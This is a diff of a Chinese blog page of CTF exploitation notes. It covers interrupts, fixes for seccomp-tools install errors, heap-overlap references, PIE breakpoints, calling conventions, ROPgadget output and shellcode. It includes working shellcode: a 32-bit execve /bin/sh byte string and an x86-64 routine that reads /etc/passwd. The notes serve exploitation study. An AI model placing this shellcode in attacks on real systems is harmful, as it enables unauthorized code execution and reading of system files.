@@ -267,7 +267,7 @@
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">7,319</span> / Reading time: <span class="post-count">40 min</span></span>
+                        <span>Word count: <span class="post-count">9,245</span> / Reading time: <span class="post-count">50 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -396,7 +396,69 @@
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <h2 id="调用约定"><a href="#调用约定" class="headerlink" title="调用约定"></a>调用约定</h2><p>32位和64位程序的区别, 更多的是体现在<a href="https://en.wikipedia.org/wiki/X86_calling_conventions" rel="external nofollow" target="_blank">调用约定(Calling Convention)</a>上. 因为64位程序有了更多的通用寄存器, 所以通常会使用寄存器来进行函数参数传递 而不是通过栈, 来获得更高的运行速度.</p>
+        <h2 id="硬中断和软中断"><a href="#硬中断和软中断" class="headerlink" title="硬中断和软中断"></a>硬中断和软中断</h2><h3 id="软中断"><a href="#软中断" class="headerlink" title="软中断"></a>软中断</h3><p>系统调用指令:</p>
+<ul>
+<li>快速系统调用指令。32位系统使用sysenter指令，64位系统使用syscall指令。</li>
+<li>软中断“int 0x80”机制，早期2.6内核及其以前的版本，才用软中断机制进行系统调用。因为软中断机制性能较差</li>
+</ul>
+<h3 id="硬中断"><a href="#硬中断" class="headerlink" title="硬中断:"></a>硬中断:</h3><p>由与系统相连的外设(比如网卡、硬盘)自动产生的。主要是用来通知操作系统系统外设状态的变化。比如当网卡收到数据包的时候，就会发出一个中断。我们通常所说的中断指的是硬中断(hardirq).</p>
+<p><strong>Note: 一个软中断不会抢占另一个软中断，唯一可以抢占软中断的是硬中断。</strong></p>
+<h2 id="安装seccomp-tools"><a href="#安装seccomp-tools" class="headerlink" title="安装seccomp-tools"></a>安装seccomp-tools</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gem install seccomp-tools</span><br></pre></td></tr></table></figure>
+<p>如果报错:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ERROR:  Could not find a valid gem &apos;seccomp-tools&apos; (&gt;= 0), here is why:</span><br><span class="line">          Unable to download data from https://gems.ruby-china.org/ - bad response Not Found 404 (https://gems.ruby-china.org/specs.4.8.gz)</span><br></pre></td></tr></table></figure>
+<p>参考链接: <code>https://blog.csdn.net/u011374880/article/details/82218802</code></p>
+<p>原因:</p>
+<p><img src="/assets/pwn/20180830113356496.png" alt=""></p>
+<p>解决方法:</p>
+<p>ruby的源</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">qianfa@qianfa:~/Desktop/pwn/pwnabletw/orw$ gem source -l</span><br><span class="line">*** CURRENT SOURCES ***</span><br><span class="line"></span><br><span class="line">https://gems.ruby-china.org/</span><br><span class="line">qianfa@qianfa:~/Desktop/pwn/pwnabletw/orw$ gem sources --remove https://gems.ruby-china.org/</span><br><span class="line">https://gems.ruby-china.org/ removed from sources</span><br><span class="line">qianfa@qianfa:~/Desktop/pwn/pwnabletw/orw$ gem sources --add https://gems.ruby-china.com/</span><br><span class="line">https://gems.ruby-china.com/ added to sources</span><br></pre></td></tr></table></figure>
+<p>继续安装，再次报错:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Building native extensions.  This could take a while...</span><br><span class="line">ERROR:  Error installing seccomp-tools:</span><br><span class="line">	ERROR: Failed to build gem native extension.</span><br><span class="line"></span><br><span class="line">    current directory: /var/lib/gems/2.3.0/gems/seccomp-tools-1.2.0/ext/ptrace</span><br><span class="line">/usr/bin/ruby2.3 -r ./siteconf20181201-13842-4wr0lq.rb extconf.rb</span><br><span class="line">mkmf.rb can&apos;t find header files for ruby at /usr/lib/ruby/include/ruby.h</span><br><span class="line"></span><br><span class="line">extconf failed, exit code 1</span><br><span class="line"></span><br><span class="line">Gem files will remain installed in /var/lib/gems/2.3.0/gems/seccomp-tools-1.2.0 for inspection.</span><br><span class="line">Results logged to /var/lib/gems/2.3.0/extensions/x86_64-linux/2.3.0/seccomp-tools-1.2.0/gem_make.out</span><br></pre></td></tr></table></figure>
+<p>解决方法:</p>
+<p>seccomp-tools应该依赖于ruby-dev,首先安装ruby-dev</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install ruby-dev</span><br></pre></td></tr></table></figure>
+<p>又报错:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">qianfa@qianfa:~/Desktop/pwn/pwnabletw/orw$ sudo apt-get install ruby-dev</span><br><span class="line">Reading package lists... Done</span><br><span class="line">Building dependency tree       </span><br><span class="line">Reading state information... Done</span><br><span class="line">The following additional packages will be installed:</span><br><span class="line">  libgmp-dev libgmpxx4ldbl ruby2.3-dev</span><br><span class="line">Suggested packages:</span><br><span class="line">  gmp-doc libgmp10-doc libmpfr-dev</span><br><span class="line">The following NEW packages will be installed:</span><br><span class="line">  libgmp-dev libgmpxx4ldbl ruby-dev ruby2.3-dev</span><br><span class="line">0 upgraded, 4 newly installed, 0 to remove and 24 not upgraded.</span><br><span class="line">Need to get 1,361 kB of archives.</span><br><span class="line">After this operation, 6,514 kB of additional disk space will be used.</span><br><span class="line">Do you want to continue? [Y/n] Y</span><br><span class="line">Get:1 http://cn.archive.ubuntu.com/ubuntu xenial/main amd64 libgmpxx4ldbl amd64 2:6.1.0+dfsg-2 [8,948 B]</span><br><span class="line">Get:2 http://cn.archive.ubuntu.com/ubuntu xenial/main amd64 libgmp-dev amd64 2:6.1.0+dfsg-2 [314 kB]</span><br><span class="line">Err:3 http://security.ubuntu.com/ubuntu xenial-security/main amd64 ruby2.3-dev amd64 2.3.1-2~16.04.10</span><br><span class="line">  404  Not Found [IP: 91.189.91.26 80]</span><br><span class="line">Get:4 http://cn.archive.ubuntu.com/ubuntu xenial/main amd64 ruby-dev amd64 1:2.3.0+1 [4,408 B]</span><br><span class="line">Err:3 http://security.ubuntu.com/ubuntu xenial-security/main amd64 ruby2.3-dev amd64 2.3.1-2~16.04.10</span><br><span class="line">  404  Not Found [IP: 91.189.91.26 80]</span><br><span class="line">Fetched 327 kB in 3s (88.7 kB/s)</span><br><span class="line">E: Failed to fetch http://security.ubuntu.com/ubuntu/pool/main/r/ruby2.3/ruby2.3-dev_2.3.1-2~16.04.10_amd64.deb  404  Not Found [IP: 91.189.91.26 80]</span><br><span class="line"></span><br><span class="line">E: Unable to fetch some archives, maybe run apt-get update or try with --fix-missing?</span><br></pre></td></tr></table></figure>
+<p>加上–fix-missing,还是报错，哎:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install ruby-dev</span><br><span class="line"></span><br><span class="line">qianfa@qianfa:~/Desktop/pwn/pwnabletw/orw$ sudo apt-get install ruby-dev --fix-missing</span><br><span class="line">Reading package lists... Done</span><br><span class="line">Building dependency tree       </span><br><span class="line">Reading state information... Done</span><br><span class="line">The following additional packages will be installed:</span><br><span class="line">  libgmp-dev libgmpxx4ldbl ruby2.3-dev</span><br><span class="line">Suggested packages:</span><br><span class="line">  gmp-doc libgmp10-doc libmpfr-dev</span><br><span class="line">The following NEW packages will be installed:</span><br><span class="line">  libgmp-dev libgmpxx4ldbl ruby-dev ruby2.3-dev</span><br><span class="line">0 upgraded, 4 newly installed, 0 to remove and 24 not upgraded.</span><br><span class="line">Need to get 1,034 kB/1,361 kB of archives.</span><br><span class="line">After this operation, 6,514 kB of additional disk space will be used.</span><br><span class="line">Do you want to continue? [Y/n] Y</span><br><span class="line">Err:1 http://security.ubuntu.com/ubuntu xenial-security/main amd64 ruby2.3-dev amd64 2.3.1-2~16.04.10</span><br><span class="line">  404  Not Found [IP: 91.189.91.26 80]</span><br><span class="line">Err:1 http://security.ubuntu.com/ubuntu xenial-security/main amd64 ruby2.3-dev amd64 2.3.1-2~16.04.10</span><br><span class="line">  404  Not Found [IP: 91.189.91.26 80]</span><br><span class="line">Unable to correct missing packages.</span><br><span class="line">E: Failed to fetch http://security.ubuntu.com/ubuntu/pool/main/r/ruby2.3/ruby2.3-dev_2.3.1-2~16.04.10_amd64.deb  404  Not Found [IP: 91.189.91.26 80]</span><br><span class="line"></span><br><span class="line">E: Aborting install.</span><br></pre></td></tr></table></figure>
+<p>解决:</p>
+<p>首先更新源:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install ruby-dev --fix-missing</span><br><span class="line">sudo gem install seccomp-tools</span><br></pre></td></tr></table></figure>
+<p>ok.</p>
+<h2 id="overlapping方法"><a href="#overlapping方法" class="headerlink" title="overlapping方法"></a>overlapping方法</h2><ul>
+<li>how2heap_overlapping_chunk</li>
+</ul>
+<p>参考 how2heap-分析总结</p>
+<ul>
+<li>how2heap_overlapping_chunk_2</li>
+</ul>
+<p>参考 how2heap-分析总结</p>
+<ul>
+<li>lctf_easy_heap_tcache</li>
+</ul>
+<p>通过unlink进行overlapping。</p>
+<p>参考tcache_study</p>
+<ul>
+<li>hitcon2018_children_tcache</li>
+</ul>
+<p>参考tcache_study</p>
+<h2 id="pwngdb-打断点"><a href="#pwngdb-打断点" class="headerlink" title="pwngdb 打断点"></a>pwngdb 打断点</h2><p>遇到开启了pie的程序，可以通过以下方式打断点:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b *$rebase(偏移)</span><br></pre></td></tr></table></figure>
+<p>比如:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000000959 loc_959:                                ; CODE XREF: main+57↑j</span><br><span class="line">.text:0000000000000959                 cmp     [rbp+var_C], 4</span><br><span class="line">.text:000000000000095D                 jle     short loc_929</span><br><span class="line">.text:000000000000095F                 mov     edi, 539h       ; status</span><br><span class="line">.text:0000000000000964                 call    exit</span><br><span class="line">.text:0000000000000964 ; &#125; // starts at 8D0</span><br></pre></td></tr></table></figure>
+<p>在exit打断点,可以这样:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b *$rebase(0x964)</span><br></pre></td></tr></table></figure>
+<h2 id="调用约定"><a href="#调用约定" class="headerlink" title="调用约定"></a>调用约定</h2><ul>
+<li><p>arm32函数调用约定<br>arm32位调用约定采用ATPCS。<br>参数1~参数4 分别保存到 R0~R3 寄存器中 ，剩下的参数从右往左一次入栈，被调用者实现栈平衡，返回值存放在 R0 中。</p>
+</li>
+<li><p>arm64函数调用约定<br>arm64位调用约定采用AAPCS64。参数1~参数8 分别保存到 X0~X7 寄存器中 ，剩下的参数从右往左一次入栈，被调用者实现栈平衡，返回值存放在 X0 中。</p>
+</li>
+<li><p>32位x86:</p>
+</li>
+<li><p>64位x64</p>
+</li>
+</ul>
+<p>32位和64位程序的区别, 更多的是体现在<a href="https://en.wikipedia.org/wiki/X86_calling_conventions" rel="external nofollow" target="_blank">调用约定(Calling Convention)</a>上. 因为64位程序有了更多的通用寄存器, 所以通常会使用寄存器来进行函数参数传递 而不是通过栈, 来获得更高的运行速度.</p>
 <p>本文主要是介绍Linux平台下的漏洞利用, 所以就专注于<code>System V AMD64 ABI</code> 的调用约定, 即函数参数从左到右依次用寄存器RDI,RSI,RDX,RCX,R8,R9来进行传递, 如果参数个数多于6个, 再通过栈来进行传递.</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$ cat victim.c</span><br><span class="line">int foo(int a, int b, int c,  int d,  int e,  int f,  int g,  int h) &#123;</span><br><span class="line">    return a + b + c + d + e + f + g + h;</span><br><span class="line">&#125;</span><br><span class="line">int main() &#123;</span><br><span class="line">    foo(1, 2, 3, 4, 5, 6, 7, 8);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">$ gcc victim.c -o victim</span><br><span class="line">$ objdump -d victim | grep &quot;&lt;main&gt;:&quot; -A 11</span><br><span class="line">00000000000006a0 &lt;main&gt;:</span><br><span class="line"> 6a0:   55                      push   rbp</span><br><span class="line"> 6a1:   48 89 e5                mov    rbp,rsp</span><br><span class="line"> 6a4:   6a 08                   push   0x8</span><br><span class="line"> 6a6:   6a 07                   push   0x7</span><br><span class="line"> 6a8:   41 b9 06 00 00 00       mov    r9d,0x6</span><br><span class="line"> 6ae:   41 b8 05 00 00 00       mov    r8d,0x5</span><br><span class="line"> 6b4:   b9 04 00 00 00          mov    ecx,0x4</span><br><span class="line"> 6b9:   ba 03 00 00 00          mov    edx,0x3</span><br><span class="line"> 6be:   be 02 00 00 00          mov    esi,0x2</span><br><span class="line"> 6c3:   bf 01 00 00 00          mov    edi,0x1</span><br><span class="line"> 6c8:   e8 93 ff ff ff          call   660 &lt;foo&gt;</span><br></pre></td></tr></table></figure>
 <h2 id="查找libc基地址"><a href="#查找libc基地址" class="headerlink" title="查找libc基地址"></a>查找libc基地址</h2><p>方法一:</p>
@@ -431,7 +493,8 @@
 <p>可以看到5fc3的偏移位置就是: ‘0x7f3’</p>
 <p>方法二:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ ROPgadget --binary vuln --all</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x0000000000000707 : add bl, dh ; ret</span><br><span class="line">0x00000000000007ff : add bl, dh ; ret</span><br><span class="line">0x0000000000000703 : add byte ptr [rax], 0 ; add byte ptr [rax], al ; ret</span><br><span class="line">0x0000000000000705 : add byte ptr [rax], al ; add bl, dh ; ret</span><br><span class="line">0x00000000000007fd : add byte ptr [rax], al ; add bl, dh ; ret</span><br><span class="line">0x00000000000007fb : add byte ptr [rax], al ; add byte ptr [rax], al ; add bl, dh ; ret</span><br><span class="line">0x0000000000000786 : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret</span><br><span class="line">0x000000000000066c : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret</span><br><span class="line">0x00000000000006bc : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret</span><br><span class="line">0x0000000000000704 : add byte ptr [rax], al ; add byte ptr [rax], al ; ret</span><br><span class="line">0x00000000000007fc : add byte ptr [rax], al ; add byte ptr [rax], al ; ret</span><br><span class="line">0x0000000000000787 : add byte ptr [rax], al ; add cl, cl ; ret</span><br><span class="line">0x0000000000000788 : add byte ptr [rax], al ; leave ; ret</span><br><span class="line">0x000000000000066e : add byte ptr [rax], al ; pop rbp ; ret</span><br><span class="line">0x00000000000006be : add byte ptr [rax], al ; pop rbp ; ret</span><br><span class="line">0x0000000000000706 : add byte ptr [rax], al ; ret</span><br><span class="line">0x00000000000007fe : add byte ptr [rax], al ; ret</span><br><span class="line">0x00000000000006fd : add byte ptr [rcx], al ; pop rbp ; ret</span><br><span class="line">0x0000000000000789 : add cl, cl ; ret</span><br><span class="line">0x00000000000005a3 : add esp, 8 ; ret</span><br><span class="line">0x0000000000000809 : add esp, 8 ; ret</span><br><span class="line">0x00000000000005a2 : add rsp, 8 ; ret</span><br><span class="line">0x0000000000000808 : add rsp, 8 ; ret</span><br><span class="line">0x0000000000000599 : and byte ptr [rax], al ; test rax, rax ; je 0x5a9 ; call rax</span><br><span class="line">0x000000000000065c : and byte ptr [rax], al ; test rax, rax ; je 0x678 ; pop rbp ; jmp rax</span><br><span class="line">0x00000000000006ad : and byte ptr [rax], al ; test rax, rax ; je 0x6c8 ; pop rbp ; jmp rax</span><br><span class="line">0x00000000000007d9 : call qword ptr [r12 + rbx*8]</span><br><span class="line">0x00000000000007da : call qword ptr [rsp + rbx*8]</span><br><span class="line">0x00000000000005a0 : call rax</span><br><span class="line">0x00000000000007dc : fmul qword ptr [rax - 0x7d] ; ret</span><br><span class="line">0x000000000000059e : je 0x5a4 ; call rax</span><br><span class="line">0x0000000000000661 : je 0x673 ; pop rbp ; jmp rax</span><br><span class="line">0x00000000000006b2 : je 0x6c3 ; pop rbp ; jmp rax</span><br><span class="line">0x0000000000000664 : jmp rax</span><br><span class="line">0x00000000000006b5 : jmp rax</span><br><span class="line">0x000000000000078a : leave ; ret</span><br><span class="line">0x00000000000006f8 : mov byte ptr [rip + 0x200911], 1 ; pop rbp ; ret</span><br><span class="line">0x0000000000000785 : mov eax, 0 ; leave ; ret</span><br><span class="line">0x00000000000007d7 : mov edi, ebp ; call qword ptr [r12 + rbx*8]</span><br><span class="line">0x00000000000007d6 : mov edi, r13d ; call qword ptr [r12 + rbx*8]</span><br><span class="line">0x0000000000000668 : nop dword ptr [rax + rax] ; pop rbp ; ret</span><br><span class="line">0x00000000000006b8 : nop dword ptr [rax + rax] ; pop rbp ; ret</span><br><span class="line">0x00000000000007f8 : nop dword ptr [rax + rax] ; ret</span><br><span class="line">0x0000000000000701 : nop dword ptr [rax] ; ret</span><br><span class="line">0x00000000000006b3 : or al, 0x5d ; jmp rax</span><br><span class="line">0x00000000000006fb : or dword ptr [rax], esp ; add byte ptr [rcx], al ; pop rbp ; ret</span><br><span class="line">0x00000000000007d8 : out dx, eax ; call qword ptr [r12 + rbx*8]</span><br><span class="line">0x00000000000007ec : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000000007ee : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000000007f0 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000000007f2 : pop r15 ; ret</span><br><span class="line">0x0000000000000663 : pop rbp ; jmp rax</span><br><span class="line">0x00000000000006b4 : pop rbp ; jmp rax</span><br><span class="line">0x00000000000007eb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000000007ef : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000000670 : pop rbp ; ret</span><br><span class="line">0x00000000000006c0 : pop rbp ; ret</span><br><span class="line">0x00000000000006ff : pop rbp ; ret</span><br><span class="line">0x00000000000007f3 : pop rdi ; ret</span><br><span class="line">0x00000000000007f1 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x00000000000007ed : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000000005a6 : ret</span><br><span class="line">0x0000000000000671 : ret</span><br><span class="line">0x00000000000006c1 : ret</span><br><span class="line">0x0000000000000700 : ret</span><br><span class="line">0x0000000000000709 : ret</span><br><span class="line">0x0000000000000708 : ret</span><br><span class="line">0x000000000000078b : ret</span><br><span class="line">0x00000000000007df : ret</span><br><span class="line">0x00000000000007f4 : ret</span><br><span class="line">0x0000000000000801 : ret</span><br><span class="line">0x0000000000000800 : ret</span><br><span class="line">0x000000000000080c : ret</span><br><span class="line">0x000000000000059d : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret</span><br><span class="line">0x0000000000000805 : sub esp, 8 ; add rsp, 8 ; ret</span><br><span class="line">0x0000000000000804 : sub rsp, 8 ; add rsp, 8 ; ret</span><br><span class="line">0x000000000000066a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret</span><br><span class="line">0x00000000000006ba : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret</span><br><span class="line">0x00000000000007fa : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret</span><br><span class="line">0x000000000000059c : test eax, eax ; je 0x5a6 ; call rax</span><br><span class="line">0x000000000000065f : test eax, eax ; je 0x675 ; pop rbp ; jmp rax</span><br><span class="line">0x00000000000006b0 : test eax, eax ; je 0x6c5 ; pop rbp ; jmp rax</span><br><span class="line">0x000000000000059b : test rax, rax ; je 0x5a7 ; call rax</span><br><span class="line">0x000000000000065e : test rax, rax ; je 0x676 ; pop rbp ; jmp rax</span><br><span class="line">0x00000000000006af : test rax, rax ; je 0x6c6 ; pop rbp ; jmp rax</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 85</span><br><span class="line">tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ ROPgadget --binary vuln --all | grep &quot;pop rdi ; ret&quot;</span><br><span class="line">0x00000000000007f3 : pop rdi ; ret</span><br></pre></td></tr></table></figure>
-<h2 id="shellcode编写"><a href="#shellcode编写" class="headerlink" title="shellcode编写"></a>shellcode编写</h2><p>读取/etc/passwd</p>
+<h2 id="32位shellcode"><a href="#32位shellcode" class="headerlink" title="32位shellcode"></a>32位shellcode</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80</span><br></pre></td></tr></table></figure>
+<h2 id="64位shellcode"><a href="#64位shellcode" class="headerlink" title="64位shellcode"></a>64位shellcode</h2><h2 id="shellcode编写"><a href="#shellcode编写" class="headerlink" title="shellcode编写"></a>shellcode编写</h2><p>读取/etc/passwd</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">BITS 64 </span><br><span class="line">; Author Mr.Un1k0d3r - RingZer0 Team </span><br><span class="line">; Read /etc/passwd Linux x86_64 Shellcode </span><br><span class="line">; Shellcode size 82 bytes </span><br><span class="line">global _start </span><br><span class="line">section .text </span><br><span class="line">_start: </span><br><span class="line">    jmp _push_filename </span><br><span class="line"></span><br><span class="line">_readfile: </span><br><span class="line">    ; syscall open file </span><br><span class="line">    pop rdi   ; pop path value </span><br><span class="line">    ; NULL byte fix </span><br><span class="line">    xor byte [rdi + 11], 0x41 </span><br><span class="line"></span><br><span class="line">    xor rax, rax </span><br><span class="line">    add al, 2 </span><br><span class="line">    xor rsi, rsi  ; set O_RDONLY flag </span><br><span class="line">    syscall </span><br><span class="line"></span><br><span class="line">    ; syscall read file </span><br><span class="line">    sub sp, 0xfff </span><br><span class="line">    lea rsi, [rsp] </span><br><span class="line">    mov rdi, rax </span><br><span class="line">    xor rdx, rdx </span><br><span class="line">    mov dx, 0xfff   ; size to read </span><br><span class="line">    xor rax, rax </span><br><span class="line">    syscall </span><br><span class="line"></span><br><span class="line">    ; syscall write to stdout </span><br><span class="line">    xor rdi, rdi </span><br><span class="line">    add dil, 1 ; set stdout fd = 1 </span><br><span class="line">    mov rdx, rax </span><br><span class="line">    xor rax, rax </span><br><span class="line">    add al, 1 </span><br><span class="line">    syscall </span><br><span class="line"></span><br><span class="line">    ; syscall exit </span><br><span class="line">    xor rax, rax </span><br><span class="line">    add al, 60 </span><br><span class="line">    syscall </span><br><span class="line"></span><br><span class="line">_push_filename: </span><br><span class="line">    call _readfile </span><br><span class="line">    path: db &quot;/etc/passwdA&quot;</span><br></pre></td></tr></table></figure>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ nasm -f elf64 readfile.asm -o readfile.o </span><br><span class="line">$ for i in $(objdump  -d readfile.o | grep &quot;^ &quot; | cut  -f2); do echo  -n  &apos;\x&apos;$i; done; echo </span><br><span class="line">\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x6 </span><br><span class="line">6\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x </span><br><span class="line">0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\ </span><br><span class="line">xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f </span><br><span class="line">\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41</span><br></pre></td></tr></table></figure>
 <p>execve /bin/sh</p>
@@ -561,28 +624,55 @@
 <p>x/x $rax                                       ;\$2=0x41</p>
 </blockquote>
 <p>差不多，区别在于打印出来的字节多少而已。</p>
